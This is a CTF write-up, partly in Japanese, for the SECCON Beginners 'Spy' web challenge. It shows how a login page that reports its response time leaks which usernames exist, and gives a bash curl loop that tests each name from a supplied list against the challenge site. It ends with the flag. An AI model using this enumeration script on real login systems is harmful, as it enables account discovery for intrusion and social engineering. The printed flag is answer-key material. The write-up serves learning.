# Spy:Web:55pts
As a spy, you are spying on the "ctf4b company".  
You got the name-list of employees and the [URL](https://spy.quals.beginners.seccon.jp) to the in-house web tool used by some of them.  
Your task is to enumerate the employees who use this tool in order to make it available for social engineering.  
- [app.py](app.py-eebd3e0541ea83ea360fa650164a231ffe410ece)  
- [employees.txt](employees.txt-c8eb600b89a185e33b6ad279b5f3b513d41b7302)  

# Solution
LoginページとChallengeページがあるようだ。  
ctf4b company  
[site1.png](site/site1.png)  
Challenge  
[site2.png](site/site2.png)  
存在するユーザをloginフォームで調査し、Challengeページで選択する。  
配布されているソースコードであるapp.pyに以下のような記述がある。  
```python:app.py
~~~
    if request.method == "POST":
        name = request.form["name"]
        password = request.form["password"]

        exists, account = db.get_account(name)

        if not exists:
            return render_template("index.html", message="Login failed, try again.", sec="{:.7f}".format(time.perf_counter()-t))

        # auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.
        # You know, it's really secure... isn't it? :-)
        hashed_password = auth.calc_password_hash(app.SALT, password)
        if hashed_password != account.password:
            return render_template("index.html", message="Login failed, try again.", sec="{:.7f}".format(time.perf_counter()-t))
~~~
```
いかにもsecが怪しい。  
ユーザ名が存在する場合パスワードをハッシュ化し、チェックしている。  
つまり、その分secが増加する。  
以下のcheck.shでemployees.txtに記述されているアカウントを確認する(手作業でソースを見てもよい)。  
```bash:check.sh
while read line
do
    echo $line >> check.txt
    curl -X POST -s -d "name=$line&password=Test" https://spy.quals.beginners.seccon.jp | grep -o It.*page. >> check.txt
done < employees.txt
```
check.txtを確認し存在するユーザを選択するとflagが手に入る。  
flag  
[flag.png](site/flag.png)  

## ctf4b{4cc0un7_3num3r4710n_by_51d3_ch4nn3l_4774ck}